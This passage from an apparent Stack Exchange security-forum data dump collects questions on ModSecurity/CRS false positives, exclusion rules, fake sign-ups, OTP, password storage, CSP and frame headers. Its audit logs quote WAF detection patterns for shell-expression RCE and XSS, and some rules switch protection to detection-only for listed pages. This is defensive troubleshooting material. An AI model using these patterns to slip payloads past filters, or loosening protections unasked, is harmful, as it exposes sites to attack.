px+10px%3B%22%3E%3Cspan+style%3D%22font-size%3A36px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3E%3Cspan+style%3D%22color%3Argb%28255%2C0%2C0%29%3B%22%3ECheck+Out+All+German+Stamps+at%3C%2Fspan%3E%26nbsp%3B*****%26nbsp%3BGerman+Lists%26nbsp%3B%3C%2Fspan%3E%3C%2Fspan%3E%3Cspan+style%3D%22font-size%3A22px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3E%3Ca+href%3D%22http%3A%2F%2F*****.com%2FGermanlists.htm%22+rel%3D%22nofollow+noreferrer+noopener%22+style%3D%22background-color%3Atransparent%3Bcolor%3Argb%2851%2C122%2C183%29%3Btext-decoration%3Anone%3B%22+target%3D%22_blank%22%3Ehttp%3A%2F%2F*****.com%2FGermanlists.htm%3C%2Fa%3E%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0px+10px%3B%22%3E%3Cspan+style%3D%22font-size%3A36px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3EStamps+are+listed+in+******+Catalog+numbers.%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%0D%0A%3Cp+style%3D%22margin%3A0px+0px+10px%3B%22%3E%3Cspan+style%3D%22color%3Argb%28255%2C0%2C0%29%3B%22%3E%3Cspan+style%3D%22font-size%3A36px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3ETo+complete+this+order+Please+contact%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fspan%3E%3Cspan+style%3D%22font-size%3A36px%3B%22%3E%3Cspan+style%3D%22font-weight%3A700%3B%22%3E%26nbsp%3B******%40centurylink.net%3C%2Fspan%3E%3C%2Fspan%3E%3C%2Fp%3E%0D%0A%3C%2Fdiv%3E%0D%0A&amp;condition=2&amp;brand=&amp;upc=&amp;mpn=&amp;220213=&amp;220214=&amp;220215=&amp;220216=&amp;220217=&amp;220218=&amp;220219=&amp;220220=&amp;220221=&amp;220222=&amp;220223=&amp;220225=&amp;220227=&amp;itemaspects=%7B%7D&amp;reserveprice=0&amp;listingtype=2&amp;binprice=1.5&amp;quantity=1&amp;duration=99&amp;service1=15&amp;servicecost1=0.60&amp;addcost1=0.00


---LoANlvlP---H--
ModSecurity: Warning. Matched &quot;Operator `Rx' with parameter `(?:\$(?:\((?:\(.*\)|.*)\)|\{.*})|[&lt;&gt;]\(.*\))' against variable `ARGS:description' (Value: `&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;span style=&quot;color:rgb(255,0,0);&quot;&gt;&lt;strong&gt;Germany Scott #B138 Used&lt; (4059 characters omitted)' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-932-APPLICATION-ATTACK-RCE.conf&quot;] [line &quot;334&quot;] [id &quot;932130&quot;] [rev &quot;&quot;] [msg &quot;Remote Command Execution: Unix Shell Expression Found&quot;] [data &quot;Matched Data: &gt;(.60 charge if under $10.00)&lt;/span&gt;&lt;span style=color:rgb(0 0 128) &gt;&lt;span style=font-size:20px &gt;&amp;nbsp &lt;/span&gt;&lt;/span&gt;&lt;/p&gt; &lt;/div&gt; &lt;p style=margin:0px 0px 10px &gt;&lt;span style=font-size:20px &gt; (5609 characters omitted)&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-shell&quot;] [tag &quot;platform-unix&quot;] [tag &quot;attack-rce&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/152/248/88&quot;] [tag &quot;PCI/6.5.2&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/sell/step3.php&quot;] [unique_id &quot;166811183185.848525&quot;] [ref &quot;o1670,1933v1501,3997t:cmdLine&quot;]
ModSecurity: Warning. detected XSS using libinjection. [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;38&quot;] [id &quot;941100&quot;] [rev &quot;&quot;] [msg &quot;XSS Attack Detected via libinjection&quot;] [data &quot;Matched Data: XSS data found within ARGS:description: &lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;span style=&quot;color:rgb(255,0,0);&quot;&gt;&lt;strong&gt;Germany Scott #B138 Used&lt;/strong&gt;\xa0&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\x0d\x0a\x0d\x0a&lt;p&gt;&lt;span style= (3796 characters omitted)&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/152/242&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/sell/step3.php&quot;] [unique_id &quot;166811183185.848525&quot;] [ref &quot;v1501,3997t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls&quot;]
ModSecurity: Warning. Matched &quot;Operator `Rx' with parameter `(?i)(?:(?:&lt;\w[\s\S]*[\s/]|['\&quot;](?:[\s\S]*[\s/])?)(?:on(?:d(?:e(?:vice(?:(?:orienta|mo)tion|proximity|found|light)|livery(?:success|error)|activate)|r(?:ag(?:e(?:n(?:ter|d)|xit)|(?:gestur|leav)e|start| (3147 characters omitted)' against variable `ARGS:description' (Value: `&lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;span style=&quot;color:rgb(255,0,0);&quot;&gt;&lt;strong&gt;Germany Scott #B138 Used&lt; (4059 characters omitted)' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-941-APPLICATION-ATTACK-XSS.conf&quot;] [line &quot;156&quot;] [id &quot;941160&quot;] [rev &quot;&quot;] [msg &quot;NoScript XSS InjectionChecker: HTML Injection&quot;] [data &quot;Matched Data: &lt;p&gt;&lt;span style=&quot;font-size:28px;&quot;&gt;&lt;span style=&quot;color:rgb(255,0,0);&quot;&gt;&lt;strong&gt;Germany Scott #B138 Used&lt;/strong&gt;\xa0&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;\x0d\x0a\x0d\x0a&lt;p&gt;&lt;span style=&quot;font-size:22px;&quot;&gt;&lt;span style=&quot;color:#00 (7661 characters omitted)&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-xss&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/152/242&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/sell/step3.php&quot;] [unique_id &quot;166811183185.848525&quot;] [ref &quot;o0,3873v1501,3997t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls&quot;]
ModSecurity: Warning. Matched &quot;Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `15' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;] [line &quot;176&quot;] [id &quot;949110&quot;] [rev &quot;&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 15)&quot;] [data &quot;&quot;] [severity &quot;0&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;anomaly-evaluation&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/sell/step3.php&quot;] [unique_id &quot;166811183185.848525&quot;] [ref &quot;&quot;]
</code></pre>
<p>How should I deal with this situation or how to craft the custom rule for this page? I'd like to protect all the pages in general, but I need a special exclusion of some kind for users submitting HTML formatting in their item description.</p>
<p>Thanks!</p>
","285362","","285362","","2022-11-11 20:59:00","2022-11-14 18:31:16","ModSecurity / CRS: Need custom rule to deal with false positive (user-inserted HTML formatted listings)","<owasp><mod-security>","2","0","","","","CC BY-SA 4.0"
"266288","1","","","2022-11-11 08:34:15","","2","354","<p>I've been dealing with a problem that I can't solve until I find the cause.
We get regularly accounts made with scraped/leaked emails and random names. They are useless because you need to verify the email before logging in, so they remain inactive. Usually, a failed register attempt wouldn't bother me, but people receive activation emails of accounts they didn't create, some mark those emails as spam, and that really bothers me.</p>
<p>If I'd knew why would anyone create such accounts, I'd be able to mitigate them in some way. I already have some checks in place, captcha pops up after the first inactive account from the same IP, but bots got kind of smart.</p>
<p>Does anyone have a clue of what would be the use for such accounts?</p>
","285372","","6253","","2022-11-11 09:15:46","2023-09-17 17:10:01","Reason to create fake accounts using real email addresses","<web-application><account-security>","3","6","","","","CC BY-SA 4.0"
"266342","1","266356","","2022-11-14 02:52:01","","0","648","<p>I have a server with 100 domain names. On each domain name, I have a unique list of pages/directories that I would like to whitelist (put ModSecurity into DetectionOnly mode temporarily). Basically, how would I write the rule for something like this where there is a set of URLs for abc.com and a set of URLs on xyz.com?:</p>
<pre><code>SecRule REQUEST_DOMAINNAME &quot;abc.com&quot; REQUEST_URI &quot;@pm /account/bulk-upload.php /account/bulk-upload/ /account/edit-account.php /account/reply-or-delete.php /contact.php /contact/ /edit/ /edit-images/ /feedback/leave-feedback.php /feedback/feedback-reply.php /img/ /login.php /maintenance/ /register.php /sell/ /store/add-categories.php /store/edit-store.php&quot; \
    &quot;id:100002,\
    phase:1,\
    t:none,\
    pass,\
    nolog,\
    ctl:ruleEngine=DetectionOnly&quot;

SecRule REQUEST_DOMAINNAME &quot;xyz.com&quot; REQUEST_URI &quot;@pm /account/bulk-upload.php /maintenance.php /edit/ /account/ /register.php /login.php /img/ /contact/ /contact-us.php&quot; \
    &quot;id:100003,\
    phase:1,\
    t:none,\
    pass,\
    nolog,\
    ctl:ruleEngine=DetectionOnly&quot;
</code></pre>
<p>I am fairly inexperienced with ModSecurity rule writing, still learning. But is <code>@pm</code> the most efficient way to apply the same rule to a list of various PHP pages and full directories (which contain multiple PHP pages)? If not, what would be a better way to write this rule?</p>
","285362","","","","","2022-11-14 16:54:30","ModSecurity: How to write exclusion rules for list of REQUEST_URIs on separate domain names?","<mod-security>","1","0","","","","CC BY-SA 4.0"
"266344","1","266355","","2022-11-14 03:32:07","","1","513","<p>I have a specific URL that keeps getting checked by weird bots, and that keeps triggering ModSecurity rules that fill up my logs. I would like to disable logging for that one specific URL to make it easier to review my logs, but continue blocking the bots.</p>
<p>Here is what I have done so far, but the logging is continuing:</p>
<pre><code>SecRule REQUEST_URI &quot;@beginsWith /widget-info-forum/&quot; \
    &quot;id:100100,\
    nolog&quot;
</code></pre>
<p>For anyone interested in the log, these are the type of things triggering the rule, a bot with &quot;Accept-Encoding header exceeded sensible length&quot;:</p>
<pre><code>---VJ89OzEF---A--
[14/Nov/2022:02:30:08 +0000] 166839300825.789080 185.25.35.15 38913 ***.***.***.*** 443
---VJ89OzEF---B--
GET /widget-info-forum/external.php?type=RSS2&amp;forumids=20 HTTP/1.1
If-Modified-Since: Sun, 06 Nov 2022 00:00:00 UTC
Accept-Encoding: gzip;q=1.0, deflate;q=0.8, chunked;q=0.6, identity;q=0.4, *;q=0
Host: www.*************.com
Connection: Keep-Alive
User-Agent: magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)

---VJ89OzEF---E--
&lt;html&gt;\x0d\x0a&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;\x0d\x0a&lt;body&gt;\x0d\x0a&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;\x0d\x0a&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\x0d\x0a&lt;/body&gt;\x0d\x0a&lt;/html&gt;\x0d\x0a

---VJ89OzEF---F--
HTTP/1.1 403
Server: nginx
Date: Mon, 14 Nov 2022 02:30:08 GMT
Content-Length: 146
Content-Type: text/html
Connection: keep-alive

---VJ89OzEF---H--
ModSecurity: Warning. Matched &quot;Operator `Gt' with parameter `50' against variable `REQUEST_HEADERS:Accept-Encoding' (Value: `gzip;q=1.0, deflate;q=0.8, chunked;q=0.6, identity;q=0.4, *;q=0' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf&quot;] [line &quot;1148&quot;] [id &quot;920520&quot;] [rev &quot;&quot;] [msg &quot;Accept-Encoding header exceeded sensible length&quot;] [data &quot;63&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-protocol&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/255/153&quot;] [tag &quot;PCI/12.1&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/widget-info-forum/external.php&quot;] [unique_id &quot;166839300825.789080&quot;] [ref &quot;v132,63t:lowercase,t:length&quot;]
ModSecurity: Access denied with code 403 (phase 2). Matched &quot;Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `5' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;] [line &quot;176&quot;] [id &quot;949110&quot;] [rev &quot;&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [data &quot;&quot;] [severity &quot;0&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;anomaly-evaluation&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/widget-info-forum/external.php&quot;] [unique_id &quot;166839300825.789080&quot;] [ref &quot;&quot;]






---agLbPHY1---A--
[14/Nov/2022:02:22:17 +0000] 166839253741.744390 185.25.35.8 36994 ***.***.***.*** 443
---agLbPHY1---B--
GET /widget-info-forum/forumdisplay.php?f=500 HTTP/1.1
If-Modified-Since: Tue, 08 Nov 2022 00:00:00 GMT
Accept-Encoding: gzip;q=1.0, deflate;q=0.8, chunked;q=0.6, identity;q=0.4, *;q=0
Host: www.*************.com
Connection: Keep-Alive
User-Agent: magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)

---agLbPHY1---E--
&lt;html&gt;\x0d\x0a&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;\x0d\x0a&lt;body&gt;\x0d\x0a&lt;center&gt;&lt;h1&gt;403 Forbidden&lt;/h1&gt;&lt;/center&gt;\x0d\x0a&lt;hr&gt;&lt;center&gt;nginx&lt;/center&gt;\x0d\x0a&lt;/body&gt;\x0d\x0a&lt;/html&gt;\x0d\x0a

---agLbPHY1---F--
HTTP/1.1 403
Server: nginx
Date: Mon, 14 Nov 2022 02:22:17 GMT
Content-Length: 146
Content-Type: text/html
Connection: keep-alive

---agLbPHY1---H--
ModSecurity: Warning. Matched &quot;Operator `Gt' with parameter `50' against variable `REQUEST_HEADERS:Accept-Encoding' (Value: `gzip;q=1.0, deflate;q=0.8, chunked;q=0.6, identity;q=0.4, *;q=0' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-920-PROTOCOL-ENFORCEMENT.conf&quot;] [line &quot;1148&quot;] [id &quot;920520&quot;] [rev &quot;&quot;] [msg &quot;Accept-Encoding header exceeded sensible length&quot;] [data &quot;63&quot;] [severity &quot;2&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;application-multi&quot;] [tag &quot;language-multi&quot;] [tag &quot;platform-multi&quot;] [tag &quot;attack-protocol&quot;] [tag &quot;paranoia-level/1&quot;] [tag &quot;OWASP_CRS&quot;] [tag &quot;capec/1000/255/153&quot;] [tag &quot;PCI/12.1&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/widget-info-forum/forumdisplay.php&quot;] [unique_id &quot;166839253741.744390&quot;] [ref &quot;v120,63t:lowercase,t:length&quot;]
ModSecurity: Access denied with code 403 (phase 2). Matched &quot;Operator `Ge' with parameter `5' against variable `TX:BLOCKING_INBOUND_ANOMALY_SCORE' (Value: `5' ) [file &quot;/etc/nginx/modsec/coreruleset-4.0.0-rc1/rules/REQUEST-949-BLOCKING-EVALUATION.conf&quot;] [line &quot;176&quot;] [id &quot;949110&quot;] [rev &quot;&quot;] [msg &quot;Inbound Anomaly Score Exceeded (Total Score: 5)&quot;] [data &quot;&quot;] [severity &quot;0&quot;] [ver &quot;OWASP_CRS/4.0.0-rc1&quot;] [maturity &quot;0&quot;] [accuracy &quot;0&quot;] [tag &quot;anomaly-evaluation&quot;] [hostname &quot;***.***.***.***&quot;] [uri &quot;/widget-info-forum/forumdisplay.php&quot;] [unique_id &quot;166839253741.744390&quot;] [ref &quot;&quot;]
</code></pre>
","285362","","","","","2022-11-14 16:08:07","ModSecurity: How to disable logging for specific REQUEST_URI?","<mod-security>","1","0","","","","CC BY-SA 4.0"
"194635","1","194640","","2018-09-28 01:10:32","","1","497","<p>Assume a customer of a bank is using online banking facility and he is using an online banking application on mobile (android).</p>

<p>There could be a possibility that particular mobile could be compromised and the purpose of having dual factor authentication could be void. The attacker could initiate online transaction through installed online application and he will receive the OTP to same mobile.</p>

<p>Is it safe to receive OTP to the same mobile where the online application is being used? Or any other alternate way of ensuring purpose of dual factor authentication?</p>
","179495","","","","","2018-09-28 05:21:16","Is it safe to receive (One Time Password) OTP to the Mobile where the online banking application is installed?","<authentication><account-security><one-time-password>","1","0","","","","CC BY-SA 4.0"
"194646","1","194647","","2018-09-28 07:50:37","","6","11951","<p>I've just inherited a project where all the passwords on the server side are simply converted to base64 and put in the database. No salt, no hash, nothing. Just a simple <code>db.Add(password.ToBase64)</code> kind of process.</p>

<p>Surely anyone who gets their hands on that data can extremely easily decode it? Hence the usual salt/hash approach.</p>

<p>I questioned the decision to use base64 strings and was told:</p>

<blockquote>
  <p>Regarding password - If someone is already on your server, you are already under threat irrespective or the encryption you choose. Its same even with someone penetrates your SSL layer itself.</p>
</blockquote>

<p>This seems to ignore the fact that hacking into a server is not the only way to access a database. It could be as easy as going through someone's unguarded computer, stumbling across a database backup and seeing the <em>blindingly obvious</em> base64 strings, then joyously converting them all to raw passwords.</p>

<p>I know this question is probably a little bit too open-ended for the ususal StackExchange format, but the issue doesn't seem to be very well covered on here with the question wording I've used. It's a pretty important topic so I thought I'd throw it up.</p>

<p>To me it's utterly obvious that <a href=""https://paragonie.com/blog/2015/08/you-wouldnt-base64-a-password-cryptography-decoded#encoding-compression"" rel=""noreferrer"">passwords shouldn't be stored using only base64 conversion</a>, but I'm still relatively new to all this so maybe I've missed something.</p>

<p>Thanks.</p>
","187660","","187660","","2018-09-28 08:03:12","2018-09-28 08:11:57","Is it okay to save passwords as base64 strings with no other hashing or encryption beforehand?","<passwords><account-security>","1","6","","","","CC BY-SA 4.0"
"194667","1","194686","","2018-09-28 14:07:49","","62","43124","<p>A while ago, I was opening Facebook app on Android and then I got the message ""Session expired. Please log in again."". I then tried logging in with my current password and was success to log in my account. Before, long time ago, when I created this account, I'd set up two-factor authentication for my account and when I checked after I did the log in, it was still active.</p>

<p>After that, I opened my laptop and Chrome then went to Facebook, just to find out that the session on PC was also logged out. After I logged back in, I went to security under settings and checked the section ""When you're logged in"" and I saw that all of the past logged in entries are gone. The only entries I got were those log in on my phone and my laptop (also appeared to be my trusted devices).</p>

<p>I was thinking of someone had tried (and succeeded?) to access my account, then logged out of all current sessions. However, I did not get any suspicious prompt on my phone to authenticate an unusual log in (Like ""Did you just logged in near location xxxxx?""), also no warning email from my registered email telling me about my account being accessed on an unrecognized browser or computer.</p>

<p><strong>Tl;dr: Facebook account suddenly got logged out of all devices, password was not changed, logged in entries are gone, no email warning about account being compromised, no two-factor authentication prompt showed up.</strong></p>

<p>My questions are:</p>

<ul>
<li><p>Are there any chances that someone was successfully able to get into my account? If yes, then how could they bypass the two-factor authentication?</p></li>
<li><p>Is that incident normal or I should take security actions?</p></li>
</ul>

<p>Thank you!</p>
","184642","","","","","2021-02-13 04:06:51","Logged out of Facebook on all devices on a sudden. Should I be worried about being hacked?","<authentication><passwords><account-security><facebook><social-media>","5","5","","","","CC BY-SA 4.0"
"194674","1","","","2018-09-28 15:28:11","","4","1210","<p>So the original security model was to ask the user for an email address, at time of account creation, and if they forgot their password the system would email a new password to this email address.</p>

<p>The idea now, however, seems to be to use security questions more.  So if I forget my password, the website asks me ""What is your pet's name?"", I type in ""chuck"" and then the website prompts me to provide a new password and lets me in.</p>

<p>The security questions model seems much less secure to me, as a dictionary attack could be more effective against it.</p>

<p>Why are we ""ok"" with security questions, as this seems to bypass our requirement for secure passwords?</p>
","187685","","151903","","2018-09-28 15:35:36","2018-09-29 17:20:48","How are ""security questions"" not a major security hole for any application that uses them?","<web-application><account-security><secret-questions>","3","4","","","","CC BY-SA 4.0"
"266519","1","","","2022-11-21 15:34:42","","0","261","<p>I need high security for my app, so I have to add security headers for my views. However, I'm not entirely sure I understood the CSP header correctly (specifically its parameters). Is my combination safe and provides high security against XSS? Can I be sure that no one will replace the action in the form and will not perform clickjacking and send the user's data from the form to himself using AJAX?</p>
<p>My CSP: <code>default-src: 'self'; object-src: 'none'; script-src: 'self'; style-src: 'self'; img-src: 'self'; connect-src: 'self'; media-src: 'none'; frames-src: 'none'; sandbox allow-same-origin; child-src: 'none'; form-action: 'self'; base-uri: 'self';</code></p>
<p>What are additional CSP parameters that I can add to provide better security?</p>
","277634","","","","","2022-11-21 15:34:42","The most safe combination for Content Security Policy","<content-security-policy><header>","0","5","","","","CC BY-SA 4.0"
"266520","1","266532","","2022-11-21 16:04:15","","1","353","<p>We host a small (.Net) website for our customers; it's designed to be embedded within both our own hosted pages, and potentially within the customers own web applications (both internal and external). By far the most common way of doing this is embed it within a <code>iframe</code> on the site.</p>
<p>So our site is explicitly designed to be within a frame; however, every vulnerability and web application security scan we run complains bitterly that we haven't set the <code>Content-Security-Policy</code> and <code>X-Frame</code> headers correctly. We currently have the CSP set as</p>
<p><code>Content-Security-Policy: default-src 'self'; script-src 'unsafe-inline' 'unsafe-eval' 'self'; style-src 'unsafe-inline' 'self'; img-src 'self' data:</code></p>
<p>(Why all those <code>unsafe</code>? Because we use a component suite (<a href=""https://www.devexpress.com/"" rel=""nofollow noreferrer"">DevExpress</a>) that <a href=""https://supportcenter.devexpress.com/ticket/details/t611617/how-to-use-devexpress-controls-with-csp-content-security-policy"" rel=""nofollow noreferrer"">explicitly requires it</a>.)</p>
<p>Even ignoring that, our security scans (via <a href=""https://cloud.tenable.com"" rel=""nofollow noreferrer"">Tenable</a>) complain that:</p>
<pre><code>- 'frame-ancestors' should be set to 'none' to avoid rendering of page in &lt;frame&gt;, &lt;iframe&gt;, &lt;object&gt;, &lt;embed&gt;, or &lt;applet&gt;.
</code></pre>
<p>We're also &quot;missing&quot; an X-Frame-Options header:</p>
<blockquote>
<p>The <code>X-Frame-Options</code> HTTP response header can be used to indicate
whether or not a browser should be allowed to render a page inside a
frame or iframe. Sites can use this to avoid clickjacking attacks, by
ensuring that their content is not embedded into other sites.</p>
</blockquote>
<p>.. but the only <a href=""https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"" rel=""nofollow noreferrer"">options</a> for this are <code>DENY</code> or <code>SAMEORIGIN</code> - we don't want either.</p>
<p>What CSP and X-Frame-Options should we specify for a site that is explitly designed to be embedded within another page?</p>
<p><strong>EDIT:</strong> To give more context about the site in question: it's a hosted service, designed to be used by our customers for their own internal staff - it's not used, presented or designed to be available to public users (although the site is publically accessible, more for convenience for our customers to be able to access it from whereever their staff are).</p>
<p>More pertenantly: although the site is used to facilitate payments, it doesn't present or collect sensitive details in any way. In effect, it's just a &quot;status&quot; page - it shows the user the status of a transaction that's taking place in real time - it's effectively &quot;read only&quot; - and the only way for that transaction to progress is via a separate, and completely out-of-band process to be taking place. Without this process progressing, the page effectively just shows &quot;Waiting ...&quot;.</p>
","210415","","210415","","2022-11-23 08:46:24","2022-11-23 08:46:24","CSP and X-Frame options for site that is designed to be embedded","<content-security-policy>","1","4","","","","CC BY-SA 4.0"
"266580","1","","","2022-11-24 01:28:51","","1","23","<p>We are developing a web application that will run on premise in customer's datacenter for security reasons. We want to sell this application with a subscription based model where we charge X dollars per user per year. The problem we are facing is how to implement this feature? Our current plan is as follows:</p>
<ol>
<li>User has to sign-in before they can do anything</li>
<li>The sign-in happens against a server we own. This is the only part where any data is sent from customer's datacenter to external internet.</li>
<li>At time of sign-in we can definitely validate whether the customer's account is in good standing and send back a signed response.</li>
<li>The client parses the response and let's the user use the application or not.</li>
</ol>
<p>The trouble in all of this is that a customer who has sufficient knowledge of programming can hack the client code (it will be JavaScript after all) and basically delete all the code that is doing the authorization. How can we stop this from happening?</p>
","44139","","","","","2022-11-24 01:28:51","How to implement subscription model for an on premise application?","<account-security>","0","1","","2022-11-24 09:32:08","","CC BY-SA 4.0"
"266628","1","","","2022-11-26 11:51:30","","2","995","<p>I received this message on my Pixel 4a phone yesterday evening:</p>
<img src=""https://i.stack.imgur.com/LDD8O.png"" width=""300"">
<p>I pressed &quot;No, it's not me&quot; and then saw this message:</p>
<img src=""https://i.stack.imgur.com/c34LH.png"" width=""300"">
<p>I was at home with a cat and five-year-old son. I was cooking and my son was playing with the cat. My phone was next to me but none of us were using any devices that interact with Google. The messages on the phone gave no details about the device and software trying to log in.</p>
<p>The first message shows the Bluetooth logo. If Bluetooth was involved then does that mean that the login attempt was happening in my home? Was it the cat? I really don't understand.</p>
<p>The messages were unhelpful, and scary and I have no idea what to do. I changed the password of my Google account but the account security section of my Google account website doesn't mention the attempted login event. Was it real?</p>
<p>How can I understand what happened?</p>
","27326","","187989","","2023-04-26 16:14:32","2023-09-23 18:03:45","How to interpret a Google ""Someone is trying to sign in to your account from another device"" message?","<authentication><account-security><multi-factor><google>","1","1","","","","CC BY-SA 4.0"
"194782","1","194808","","2018-09-30 13:22:40","","0","520","<p>I have seen many experts advising usage of some kind of OTP as second step of 2FA schemes.</p>
<p>I fully understand 2FA is more secure than Single Authorization, but it is also more inconvenient for a casual user.</p>
<p>What about <em>replacing</em> passwords with HOTP (HMAC-based One-time Password algorithm)?</p>
<p>We currently have schemes with <strong>strong passwords</strong> (not really so strong, current policy is: 8+ chars, mixed case, at least one numeric and at least one special) changed on regular basis and many users are already complaining.</p>
<p>I am wondering if <em>replacing</em> passwords with HOTP (possibly google-authenticator, supported by google-authenticator-libpam) would result in lower security than our present scheme.</p>
<p>Rationale is long random (generated) passwords will force users to write them down in some &quot;handy&quot; place, usually somewhere an attacker will find easily.
Using [H]OTP would render this useless, while still being <strong>convenient</strong> as everybody has a smartphone on the desk, today.</p>
<p>Questions are:</p>
<ul>
<li><p>Am I forgetting something important?</p>
</li>
<li><p>Is google-authenticator (or other OTP scheme) fundamentally flawed somehow?</p>
</li>
<li><p>If viable, what are pitfalls (if any)?</p>
</li>
</ul>
<p>Note 1: I know multiple questions are usually badly received, but this really boils down to: <strong>Can I use this with <em>reasonable</em> security?</strong></p>
<p>Note 2: We are not concerned with <strong>absolute security</strong> (as if such a beast would exist in the real world), but we wouldn't want to lower security level we have now either.</p>
","94014","","6253","","2021-10-16 23:04:43","2021-10-16 23:04:43","Is using HOTP only authorization considered weak?","<authentication><passwords><password-policy><account-security><hotp>","1","6","","","","CC BY-SA 4.0"
"129372","1","129374","","2016-07-06 18:02:20","","1","174","<p>We have a setup where if a user gets locked out of their Windows machine, then their department or assistant manager can unlock their account. We are being asked to expand this so that any employee can unlock another employee's account. </p>

<p>Note: We have a script that can unlock a user which can be run if you are in the correct <em>AD security group</em>.</p>

<p>This strikes me as a bad practice. Should this be allowed? If so, why?</p>
","5845","","79297","","2016-07-06 18:49:46","2016-07-06 18:49:46","Windows Domain Account Unlock Best Practices?","<account-security>","1","2","","","","CC BY-SA 3.0"
"266772","1","","","2022-12-02 19:31:54","","1","114","<p>The following process overview schematic is derived from IBM's <a href=""https://www.redbooks.ibm.com/redpapers/pdfs/redp4641.pdf"" rel=""nofollow noreferrer"">Security in Development The IBM Secure Engineering Framework</a>, but I think I've seen a very similar process diagram before, though I cannot find it or remember it. Would this IBM Security and Privacy by Design (SPbD) process be based on an existing standard or guideline, e.g., one from NIST or ISO? It is a fairly sensible process so I would not be surprised if a similar process has been drawn before.</p>
<p><a href=""https://i.stack.imgur.com/t5Rmm.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/t5Rmm.png"" alt=""Security and Privacy by Design"" /></a></p>
","286288","","6253","","2022-12-05 08:05:16","2023-05-04 09:00:40","Is IBM's ""Security and Privacy by Design"" practices based on any earlier standard or guideline?","<process><security-by-design>","1","1","","","","CC BY-SA 4.0"
"266794","1","266850","","2022-12-03 12:52:42","","1","123","<p>Would the configuration described below violate any Security Technical Implementation Guides (STIGs)?</p>
<div class=""s-table-container"">
<table class=""s-table"">
<thead>
<tr>
